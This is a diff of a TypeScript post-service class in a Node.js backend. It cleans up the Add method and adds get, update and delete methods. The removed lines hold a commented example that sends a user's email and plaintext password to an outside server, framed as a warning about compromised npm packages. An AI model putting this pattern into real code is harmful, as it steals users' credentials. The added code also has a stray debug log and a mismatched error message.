@@ -15,53 +15,23 @@ export default class PostService {
     private mailer: MailerService,
     @Inject('logger') private logger,
     @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
-  ) {
-  }
+  ) {}
 
-  public async Add(postInputDTO: IPostInputDTO): Promise<{ post: IPost}> {
+  public async Add(postInputDTO: IPostInputDTO): Promise<{ post: IPost }> {
     try {
-     
-
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
-     
-      
       this.logger.silly('Creating post db record');
       const postRecord = await this.postModel.create({
         ...postInputDTO,
-       
       });
       this.logger.silly('Generating JWT');
-     
 
       if (!postRecord) {
         throw new Error('Post cannot be created');
       }
 
       this.eventDispatcher.dispatch(events.post.add, { post: postRecord });
-
-      /**
-       * @TODO This is not the best way to deal with this
-       * There should exist a 'Mapper' layer
-       * that transforms data from layer to layer
-       * but that's too over-engineering for now
-       */
       const post = postRecord.toObject();
-      
+
       return { post };
     } catch (e) {
       this.logger.error(e);
@@ -84,5 +54,64 @@ export default class PostService {
     }
   }
 
+  public async getPostById(postId: string): Promise<IPost> {
+    try {
+      this.logger.silly('get post by id from db record');
+      const postRecord = await this.postModel.findById(postId);
 
+      if (!postRecord) {
+        throw new Error('Post cannot be updated');
+      }
+
+      this.eventDispatcher.dispatch(events.post.list, postRecord);
+      const post = postRecord.toObject();
+
+      return post;
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
+
+  public async Update(postInputDTO: IPostInputDTO, postId: string): Promise<IPost> {
+    console.log(".........",postId)
+    try {
+      this.logger.silly('Updating post db record');
+      const postRecord = await this.postModel.findByIdAndUpdate(
+        { _id: postId },
+        {
+          ...postInputDTO,
+      });
+
+      if (!postRecord) {
+        throw new Error('Post cannot be updated');
+      }
+
+      this.eventDispatcher.dispatch(events.post.update, { post: postRecord });
+      const post = postRecord.toObject();
+
+      return post;
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
+
+  public async Delete(postId: string): Promise<{ post: IPost }> {
+    try {
+      this.logger.silly('Deleting post db record');
+      const postRecord = await this.postModel.findByIdAndDelete(postId);
+      if (!postRecord) {
+        throw new Error('Post cannot be deleted');
+      }
+
+      this.eventDispatcher.dispatch(events.post.delete, { post: postRecord });
+      const post = postRecord.toObject();
+
+      return { post };
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
 }
